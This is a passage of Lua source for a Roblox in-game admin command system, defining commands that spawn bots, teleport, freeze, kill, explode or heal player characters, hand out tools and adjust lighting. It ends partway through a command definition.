set.MakeCommand('Gives the target player(s) a sword',2,set.Prefix,{'sword','givesword'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
local sword = Instance.new("Tool", v.Backpack) sword.Name = "Sword"  sword.TextureId = "rbxasset://Textures/Sword128.png"
sword.GripForward = Vector3.new(-1,0,0)
sword.GripPos = Vector3.new(0,0,-1.5)
sword.GripRight = Vector3.new(0,1,0)
sword.GripUp = Vector3.new(0,0,1)
local handle = Instance.new("Part", sword) handle.Name = "Handle" handle.FormFactor = "Plate" handle.Size = Vector3.new(1,.8,4) handle.TopSurface = 0 handle.BottomSurface = 0
local msh = Instance.new("SpecialMesh", handle) msh.MeshId = "rbxasset://fonts/sword.mesh" msh.TextureId = "rbxasset://textures/SwordTexture.png"
local cl=deps.SwordScript:clone() cl.Parent=sword cl.Disabled=false
end
end))
end
end)

set.MakeCommand('Clones the target player(s)',2,set.Prefix,{'clone','cloneplayer'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
v.Character.Archivable = true 
local cl = v.Character:Clone() 
table.insert(set.objects,cl) 
cl.Parent = game.Workspace 
cl:MoveTo(v.Character:GetModelCFrame().p)
cl:MakeJoints()
v.Character.Archivable = false 
repeat wait() until not cl or not cl.Humanoid or cl.Humanoid.Health<=0
wait(5)
if cl then cl:Destroy() end
end
end)()
end
end)

set.MakeCommand('Configurable AIs made for training, :bot me 5 true true true makes 5 bots that attack, stack, and run to players to kill them',2,set.Prefix,{'bot','tbot','trainingbot','bots','robot','robots','dummy','dummys','testdummy','testdummys','dolls','doll'},{'plr','num','walk','attk','swarm','speed','dmg','hp','dist'},9,function(plr,args)
	local walk=false 
	if args[3] then if args[3]:lower()=='true' or args[3]:lower()=='yes' then walk=true end end
	local attack=false
	if args[4] then if args[4]:lower()=='true' or args[4]:lower()=='yes' then attack=true end end
	local health=args[8] or 100
	local damage=args[7] or 10
	local walkspeed=args[6] or 20
	local dist=args[9] or 100
	local swarm=false
	if args[5] then if args[5]:lower()=='true' or args[5]:lower()=='yes' then swarm=true end end
	local function makedolls(player)
		local num=args[2] or 1
		local pos=player.Character.Torso.CFrame
		num=tonumber(num)
		if num>50 then num=50 end
		for i=1,num do
			coroutine.wrap(function()
				player.Character.Archivable = true
				local cl = player.Character:Clone() 
				player.Character.Archivable = false
				table.insert(set.objects,cl)
				local anim=script['Script Dependencies'].Animate:Clone()
				anim.Parent=cl 
				anim.Disabled=false
				cl.Parent = game.Workspace 
				cl.Name='~=Bot=~'
				if cl:FindFirstChild('Animate') then cl.Animate:Destroy() end
				cl.Humanoid.MaxHealth=health
				wait()
				cl.Humanoid.Health=health
				cl.Torso.CFrame=pos*CFrame.Angles(0,math.rad(360/num*i),0)*CFrame.new(5+.2*num,0,0)
				cl:MakeJoints()
				cl.Humanoid.WalkSpeed=walkspeed
				for k,f in pairs(cl:children()) do if f.ClassName=='ForceField' then f:Destroy() end end
				local run=true
				local thing
				local target
				local chasing=false
				local function find()
					for k,n in pairs(game:service('Players'):GetPlayers()) do
						coroutine.wrap(function()
							if swarm and not chasing and n:DistanceFromCharacter(cl.Torso.Position) < tonumber(dist) then
								n=n.Character
								if not n:FindFirstChild('Humanoid') or not n:FindFirstChild('Torso') or n.Humanoid.Health>=math.huge or n:FindFirstChild('ForceField') then return end
								target=n.Torso
								chasing=true
								repeat wait() until chasing==false or n.Humanoid.Health<=0 or n.Humanoid.Health>=math.huge or n:FindFirstChild('ForceField') or not n:FindFirstChild('Torso') or not n
								chasing=false
							end
						end)()
					end
				end
				coroutine.wrap(function()
					if not cl.Humanoid or not cl.Torso then return end
					thing=cl.Torso.Touched:connect(function(hit) 
						coroutine.wrap(function()
							if attack and run and cl and hit.Parent:FindFirstChild('Humanoid') and hit.Parent:FindFirstChild('Torso') and hit.Parent.Name~='~=Bot=~' then
								if hit.Parent.Humanoid.Health>=math.huge or hit.Parent:FindFirstChild('ForceField') then return end
								hit.Parent.Humanoid.Health=hit.Parent.Humanoid.Health-damage
								target=hit.Parent.Torso
								chasing=true
								repeat wait() until chasing==false or hit.Parent.Humanoid.Health<=0 or hit.Parent.Humanoid.Health>=math.huge or hit.Parent:FindFirstChild('ForceField') or not hit.Parent:FindFirstChild('Torso') or not hit.Parent
								chasing=false
							end
						end)()
						
					end)
					repeat
						if not walk then return end
						if cl.Humanoid.Sit then
							cl.Humanoid.Jump=true
							cl.Humanoid.Sit=false
						end
						if chasing then
							wait() 
							cl.Humanoid.WalkToPoint=target.Position
							if math.abs(cl.Torso.Position.Y-target.Position.Y)>7 then
								cl.Humanoid.Jump=true
							end
						else
							cl.Humanoid.WalkToPoint=Vector3.new(math.random(cl.Torso.Position.X-100,cl.Torso.Position.X+100),cl.Torso.Position.Y,math.random(cl.Torso.Position.Z-100,cl.Torso.Position.Z+100))
							wait(1)
						end
						pcall(find)
						wait()
					until not cl or not cl.Humanoid or cl.Humanoid.Health<=0 or not run
				end)()
				repeat wait() until not cl or not cl.Humanoid or cl.Humanoid.Health<=0 or not run
				run=false
				pcall(function() thing:disconnect() end)
				wait(2)
				pcall(function() if cl then cl:Destroy() end end)
			end)()
		end
	end
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		makedolls(v)
	end
end)

set.MakeCommand('Gives you a tool that lets you click where you want the target player to stand, hold r to rotate them',2,set.Prefix,{'clickteleport','teleporttoclick','ct','clicktp','forceteleport','ctp','ctt'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local tool=Instance.new('HopperBin',plr.Backpack)
local cl=deps.ClickToTool:clone()
cl.Target.Value=v.Name
cl.Mode.Value='Teleport'
cl.Parent=tool
cl.Disabled=false
end)()
end
end)

set.MakeCommand('Gives you a tool that lets you click where you want the target player to walk, hold r to rotate them',2,set.Prefix,{'clickwalk','cw','ctw','forcewalk','walktool','walktoclick','clickcontrol','forcewalk'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local tool=Instance.new('HopperBin',plr.Backpack)
local cl=deps.ClickToTool:clone()
cl.Target.Value=v.Name
cl.Mode.Value='Walk'
cl.Parent=tool
cl.Disabled=false
end)()
end
end)

set.MakeCommand('Swaps player1\'s and player2\'s bodies and tools',2,set.Prefix,{'bodyswap','bodysteal','bswap'},{'player1','player2'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
	for i2,v2 in pairs(set.GetPlayers(plr,args[2])) do
		local temptools=Instance.new('Model')
		local tempcloths=Instance.new('Model')
		local vpos=v.Character.Torso.CFrame
		local v2pos=v2.Character.Torso.CFrame
		local vface=v.Character.Head.face
		local v2face=v2.Character.Head.face
		vface.Parent=v2.Character.Head
		v2face.Parent=v.Character.Head
		for k,p in pairs(v.Character:children()) do
			if p:IsA('BodyColors') or p:IsA('CharacterMesh') or p:IsA('Pants') or p:IsA('Shirt') or p:IsA('Hat') then
				p.Parent=tempcloths
			elseif p:IsA('Tool') then
				p.Parent=temptools
			end
		end	
		for k,p in pairs(v.Backpack:children()) do
			p.Parent=temptools
		end
		for k,p in pairs(v2.Character:children()) do
			if p:IsA('BodyColors') or p:IsA('CharacterMesh') or p:IsA('Pants') or p:IsA('Shirt') or p:IsA('Hat') then
				p.Parent=v.Character
			elseif p:IsA('Tool') then
				p.Parent=v.Backpack
			end
		end	
		for k,p in pairs(tempcloths:children()) do
			p.Parent=v2.Character
		end	
		for k,p in pairs(v2.Backpack:children()) do
			p.Parent=v.Backpack
		end
		for k,p in pairs(temptools:children()) do
			p.Parent=v2.Backpack
		end
		v2.Character.Torso.CFrame=vpos
		v.Character.Torso.CFrame=v2pos
	end
	end 
end)

set.MakeCommand('Lets you take control of the target player',2,set.Prefix,{'control','takeover'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
v.Character.Humanoid.PlatformStand = true
local w = Instance.new("Weld", plr.Character.Torso ) 
w.Part0 = plr.Character.Torso 
w.Part1 = v.Character.Torso  
local w2 = Instance.new("Weld", plr.Character.Head) 
w2.Part0 = plr.Character.Head 
w2.Part1 = v.Character.Head  
local w3 = Instance.new("Weld", plr.Character:findFirstChild("Right Arm")) 
w3.Part0 = plr.Character:findFirstChild("Right Arm")
w3.Part1 = v.Character:findFirstChild("Right Arm") 
local w4 = Instance.new("Weld", plr.Character:findFirstChild("Left Arm"))
w4.Part0 = plr.Character:findFirstChild("Left Arm")
w4.Part1 = v.Character:findFirstChild("Left Arm") 
local w5 = Instance.new("Weld", plr.Character:findFirstChild("Right Leg")) 
w5.Part0 = plr.Character:findFirstChild("Right Leg")
w5.Part1 = v.Character:findFirstChild("Right Leg") 
local w6 = Instance.new("Weld", plr.Character:findFirstChild("Left Leg")) 
w6.Part0 = plr.Character:findFirstChild("Left Leg")
w6.Part1 = v.Character:findFirstChild("Left Leg") 
plr.Character.Head.face:Destroy()
for i, p in pairs(v.Character:children()) do
if p:IsA("BasePart") then 
p.CanCollide = false
end
end
for i, p in pairs(plr.Character:children()) do
if p:IsA("BasePart") then 
p.Transparency = 1 
elseif p:IsA("Hat") then
p:Destroy()
end
end
v.Character.Parent = plr.Character
--v.Character.Humanoid.Changed:connect(function() v.Character.Humanoid.PlatformStand = true end)
end
end)()
end
end)

set.MakeCommand('Refreshes the target player(s)\'s character',2,set.Prefix,{'refresh','reset'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local pos=v.Character.Torso.CFrame
local temptools={}
pcall(function() v.Character.Humanoid:UnequipTools() end)
wait()
for k,t in pairs(v.Backpack:children()) do
	if t:IsA('Tool') or t:IsA('Hopperbin') then
		table.insert(temptools,t)
	end
end
v:LoadCharacter()
v.Character.Torso.CFrame=pos
for d,f in pairs(v.Character:children()) do
	if f:IsA('ForceField') then f:Destroy() end
end
wait(1)
v.Backpack:ClearAllChildren()
for l,m in pairs(temptools) do
	m:clone().Parent=v.Backpack
end
end)()
end
end)

set.MakeCommand('Kills the target player(s)',2,set.Prefix,{'kill'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v.Character:BreakJoints() end
end)()
end
end)

set.MakeCommand('Repsawns the target player(s)',2,set.Prefix,{'respawn'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v:LoadCharacter()
	set.Remote(v,'Function','SetView','reset')
end
end)()
end
end)

set.MakeCommand('Rotates the target player(s) by 180 degrees or the angle you set',2,set.Prefix,{'trip'},{'player','angle'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local angle=180 or args[2]
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
v.Character.Torso.CFrame = v.Character.Torso.CFrame * CFrame.Angles(0,0,math.rad(angle)) 
end
end)()
end
end)

set.MakeCommand('Stuns the target player(s)',2,set.Prefix,{'stun'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.PlatformStand = true
end
end)()
end
end)

set.MakeCommand('UnStuns the target player(s)',2,set.Prefix,{'unstun'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.PlatformStand = false
end
end)()
end
end)

set.MakeCommand('Forces the target player(s) to jump',2,set.Prefix,{'jump'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.Jump = true
end
end)()
end
end)

set.MakeCommand('Forces the target player(s) to sit',2,set.Prefix,{'sit','seat'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.Sit = true
end
end)()
end
end)

set.MakeCommand('Makes the target player(s) invisible',2,set.Prefix,{'invisible'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Transparency = 1 if obj:findFirstChild("face") then obj.face.Transparency = 1 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 1 end
end
end
end)()
end
end)

set.MakeCommand('Makes the target player(s) visible',2,set.Prefix,{'visible'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") and obj.Name~='HumanoidRootPart' then obj.Transparency = 0 if obj:findFirstChild("face") then obj.face.Transparency = 0 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 0 end
end
end
end)()
end
end)

set.MakeCommand('Locks the target player(s)',2,set.Prefix,{'lock'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr,args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Locked = true elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Locked = true end
end
end
end)()
end
end)

set.MakeCommand('UnLocks the the target player(s), makes it so you can use btools on them',2,set.Prefix,{'unlock'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Locked = false elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Locked = false end
end
end
end)()
end
end)

set.MakeCommand('Explodes the target player(s)',2,set.Prefix,{'explode','boom','boomboom'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
local ex = Instance.new("Explosion", game.Workspace) 
ex.Position = v.Character.Torso.Position
ex.BlastRadius=20
end
end)()
end
end)

set.MakeCommand('Makes a PointLight on the target player(s) with the color specified',2,set.Prefix,{'light'},{'player','color'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local str = BrickColor.new('Bright blue').Color
if args[2] then
local teststr = args[2]
if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
end
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local p=Instance.new('PointLight',v.Character.Torso)
table.insert(set.objects,p)
p.Color=str
p.Brightness=5
p.Range=15
end
end)()
end
end)

set.MakeCommand('UnLights the target plyer(s)',2,set.Prefix,{'unlight'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do 
	if cl:IsA('PointLight') then cl:Destroy() end 
end
end
end)()
end
end)

set.MakeCommand('Makes a dialog bubble appear over the target player(s) head with the desired message',-1,set.Prefix,{'talk','maketalk'},{'player','message'},2,function(plr,args)
local message = args[2]
for i,p in pairs(set.GetPlayers(plr, args[1]:lower())) do
coroutine.wrap(function()
game:service('Chat'):Chat(p.Character.Head,message,Enum.ChatColor.Blue)
end)()
end
end)

set.MakeCommand('Sets the target player(s) on fire, coloring the fire based on what you set',-1,set.Prefix,{'fire','makefire','givefire'},{'player','color'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local str = BrickColor.new('Bright orange').Color
if args[2] then
local teststr = args[2]
if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
end
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local f=Instance.new('Fire',v.Character.Torso)
local p=Instance.new('PointLight',v.Character.Torso)
table.insert(set.objects,f)
table.insert(set.objects,p)
p.Color=str
p.Brightness=5
p.Range=15
f.Color=str
f.SecondaryColor=str
end
end)()
end
end)

set.MakeCommand('Puts out the flames on the target player(s)',-1,set.Prefix,{'unfire','removefire','extinguish'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Fire") or cl:IsA('PointLight') then cl:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Makes smoke come from the target player(s) with the desired color',-1,set.Prefix,{'smoke','givesmoke'},{'player','color'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local str = BrickColor.new('Bright orange').Color
if args[2] then
local teststr = args[2]
if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
end
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local cl = Instance.new("Smoke", v.Character.Torso) table.insert(set.objects, cl)
cl.Color=str
end
end)()
end
end)

set.MakeCommand('Removes smoke from the target player(s)',-1,set.Prefix,{'unsmoke'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Smoke") then cl:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Puts sparkles on the target player(s) with the desired color',-1,set.Prefix,{'sparkles'},{'player','color'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local str = BrickColor.new('Bright blue').Color
if args[2] then
local teststr = args[2]
if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
end
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local cl = Instance.new("Sparkles", v.Character.Torso) table.insert(set.objects, cl)
local p=Instance.new('PointLight',v.Character.Torso) table.insert(set.objects, p)
p.Color=str
p.Brightness=5
p.Range=15
cl.SparkleColor=str
end
end)()
end
end)

set.MakeCommand('Removes sparkles from the target player(s)',-1,set.Prefix,{'unsparkles'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Sparkles") or cl:IsA('PointLight') then cl:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Gives a force field to the target player(s)',2,set.Prefix,{'ff','forcefield'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then Instance.new("ForceField", v.Character) end
end)()
end
end)

set.MakeCommand('Removes force fields on the target player(s)',2,set.Prefix,{'unff','unforcefield'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function() 
if v and v.Character then 
for z, cl in pairs(v.Character:children()) do if cl:IsA("ForceField") then cl:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Removes the target player(s)\'s character',2,set.Prefix,{'punish'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
v.Character.Parent = set.Storage
end
end)()
end
end)

set.MakeCommand('Gives the target player(s) hat pets, controled using the !pets command.',-1,set.Prefix,{'hatpets'},{'player','number[50 MAX]/destroy'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		if args[2] and args[2]:lower()=='destroy' then
			local hats=v.Character:FindFirstChild('EpixHatPets')
			if hats then hats:Destroy() end
		else
			local num=tonumber(args[2]) or 5
			if num>50 then num=50 end
			if v.Character:FindFirstChild('Torso') then
				local m=v.Character:FindFirstChild('EpixHatPets')
				local mode
				local obj
				local hat
				if not m then
					m=Instance.new('Model',v.Character)
					m.Name='EpixHatPets'
					table.insert(set.objects,m)
					mode=Instance.new('StringValue',m)
					mode.Name='Mode'
					mode.Value='Follow'
					obj=Instance.new('ObjectValue',m)
					obj.Name='Target'
					obj.Value=v.Character.Torso
				else
					mode=m.Mode
					obj=m.Target
				end
				for l,h in pairs(v.Character:children()) do if h:IsA('Hat') then hat=h break end end
				if hat then
					for k=1,num do
						local cl=hat.Handle:clone()
						cl.Name=k
						cl.CanCollide=false
						cl.Anchored=false
						cl.Parent=m
						local bpos=Instance.new("BodyPosition",cl)
						bpos.Name='bpos'
						bpos.position=obj.Value.Position
						bpos.maxForce = bpos.maxForce * 10
					end
				end
				set.Remote(v,'Function','MoveHats')
			end
		end
	end
end)

set.MakeCommand('[NEED HAT PETS TO USE] Makes your hat pets do the specified command (follow/float/swarm/attack)',2,set.AnyPrefix,{'pets'},{'follow/float/swarm/attack','player'},2,function(plr,args)
	local hats=plr.Character:FindFirstChild('EpixHatPets')
	if hats then
		for i,v in pairs(set.GetPlayers(plr,args[2])) do
			if v.Character:FindFirstChild('Torso') and v.Character.Torso:IsA('Part') then
				if args[1]:lower()=='follow' then
					hats.Mode.Value='Follow'
					hats.Target.Value=v.Character.Torso
				elseif args[1]:lower()=='float' then
					hats.Mode.Value='Float'
					hats.Target.Value=v.Character.Torso
				elseif args[1]:lower()=='swarm' then
					hats.Mode.Value='Swarm'
					hats.Target.Value=v.Character.Torso
				elseif args[1]:lower()=='attack' then
					hats.Mode.Value='Attack'
					hats.Target.Value=v.Character.Torso
				end
			end
		end
	else
		set.Remote(plr,'Function','OutputGui',"You don't have any hat pets! If you are an admin use the :hatpets command to get some")
	end
end)

set.MakeCommand('UnPunishes the target player(s)',2,set.Prefix,{'unpunish'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
v.Character.Parent = game:service("Workspace") v.Character:MakeJoints()
end
end)

set.MakeCommand('Freezes the target player(s)',2,set.Prefix,{'freeze'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Anchored = true end v.Character.Humanoid.WalkSpeed = 0
end
end
end)()
end
end)

set.MakeCommand('UnFreezes the target players, thaws them out',2,set.Prefix,{'thaw','unfreeze'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Anchored = false end v.Character.Humanoid.WalkSpeed = 16
end
end
end)()
end
end)

set.MakeCommand('Heals the target player(s) (Regens their health)',2,set.Prefix,{'heal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end)()
end
end)

set.MakeCommand('Makes the target player(s) immortal, makes their health so high that normal non-explosive weapons can\'t kill them',2,set.Prefix,{'god','immortal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.MaxHealth = math.huge
v.Character.Humanoid.Health = 9e9
end
end)()
end
end)

set.MakeCommand('Makes the target player(s) mortal again',2,set.Prefix,{'ungod','mortal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.MaxHealth = 100
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end)()
end
end)

set.MakeCommand('Change Ambient',2,set.Prefix,{'ambient'},{'num','num','num'},3,function(plr,args)
game:service('Lighting').Ambient = Color3.new(args[1],args[2],args[3])
end)

set.MakeCommand('Change OutdoorAmbient',2,set.Prefix,{'oambient','outdoorambient'},{'num','num','num'},3,function(plr,args)
game:service('Lighting').OutdoorAmbient = Color3.new(args[1],args[2],args[3])
end)

set.MakeCommand('Fog Off',2,set.Prefix,{'nofog','fogoff'},{},0,function(plr,args)
game:service('Lighting').FogEnd=1000000000000
end)

set.MakeCommand('Determines if shadows are on or off',2,set.Prefix,{'shadows'},{'on/off'},1,function(plr,args)
if args[1]:lower()=='on' then
	game:service('Lighting').GlobalShadows=true
elseif args[1]:lower()=='off' then
	game:service('Lighting').GlobalShadows=false
end
end)

set.MakeCommand('Determines if outlines are on or off',2,set.Prefix,{'outlines'},{'on/off'},1,function(plr,args)
if args[1]:lower()=='on' then
	game:service('Lighting').Outlines=true
elseif args[1]:lower()=='off' then
	game:service('Lighting').Outlines=false
end
end)

set.MakeCommand('Repeats <command> for <amount> of times every <interval> seconds',2,set.Prefix,{'repeat','loop'},{'amount','interval','command'},3,function(plr,args)
local amount = tonumber(args[1])
local timer = tonumber(args[2])
if timer<=0 then timer=1 end
local command = args[3]:lower()
local num=0
coroutine.wrap(function()
repeat
set.ProcessCommand(plr,command,true)
wait(timer)
num=num+1
until num==amount
end)()
end)

set.MakeCommand('Change Brightness',2,set.Prefix,{'brightness'},{'number'},1,function(plr,args)
game:service('Lighting').Brightness =args[1]
end)

set.MakeCommand('Change Time',2,set.Prefix,{'time','timeofday'},{'time'},1,function(plr,args)
game:service('Lighting').TimeOfDay = args[1]
end)

set.MakeCommand('Fog Color',2,set.Prefix,{'fogcolor'},{'num','num','num'},3,function(plr,args)
game:service('Lighting').FogColor = Color3.new(args[1],args[2],args[3])
end)

set.MakeCommand('Fog Start/End',2,set.Prefix,{'fog'},{'start','end'},2,function(plr,args)
game:service('Lighting').FogEnd = args[2]
game:service('Lighting').FogStart = args[1]
end)

set.MakeCommand('Gives the target player(s) basic building tools and the F3X tool',2,set.Prefix,{'btools','buildtools','buildingtools','buildertools'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("Backpack") then 
local t1 = Instance.new("HopperBin", v.Backpack) t1.Name = "Move" t1.BinType = "GameTool"
local t2 = Instance.new("HopperBin", v.Backpack) t2.Name = "Clone" t2.BinType = "Clone"
local t3 = Instance.new("HopperBin", v.Backpack) t3.Name = "Delete" t3.BinType = "Hammer"
deps['F3X Building Tools']:Clone().Parent=v.Backpack
local t4 = Instance.new("HopperBin", v.Backpack) t4.Name = "Resize"
local cl=deps.ResizeScript:clone()
cl.Parent=t4
cl.Disabled=false
end
end)()
end
end)

set.MakeCommand('Places the desired tool into the target player(s)\'s StarterPack',2,set.Prefix,{'startergive'},{'player','toolname'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("StarterGear") and game:findFirstChild("Lighting") then 
for a, tool in pairs(set.Storage:children()) do
if tool:IsA("Tool") or tool:IsA("HopperBin") then
if args[2]:lower() == "all" or tool.Name:lower():find(args[2]:lower()) == 1 then tool:Clone().Parent = v.StarterGear end
end
end
end
end)()
end
end)

set.MakeCommand('Gives the target player(s) the desired tool(s)',2,set.Prefix,{'give','tool'},{'player','tool'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
for a, tool in pairs(set.Storage:children()) do
if tool:IsA("Tool") or tool:IsA("HopperBin") then
if args[2]:lower() == "all" or tool.Name:lower():sub(1,#args[2])==args[2]:lower() then 
	tool:clone().Parent = v.Backpack 
end
end
end
end)()
end
end)

set.MakeCommand('Steals player1\'s tools and gives them to player2',2,set.Prefix,{'steal','stealtools'},{'player1','player2'},2,function(plr,args)
local p1 = set.GetPlayers(plr, args[1]:lower())
local p2 = set.GetPlayers(plr, args[2]:lower())
coroutine.wrap(function()
for i,v in pairs(p1) do
	coroutine.wrap(function()
	for k,m in pairs(p2) do
		for j,n in pairs(v.Backpack:children()) do
			print(n.Name)
			local b=n:clone()
			n.Parent=m.Backpack
		end
	end
	v.Backpack:ClearAllChildren()
	end)()
end
end)()
end)

set.MakeCommand('Remove the target player(s)\'s screen guis',2,set.Prefix,{'removeguis','noguis'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		set.Remote(v,'Function','RemoveGuis')
	end
end)

set.MakeCommand('Remove the target player(s)\'s tools',2,set.Prefix,{'removetools','notools'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
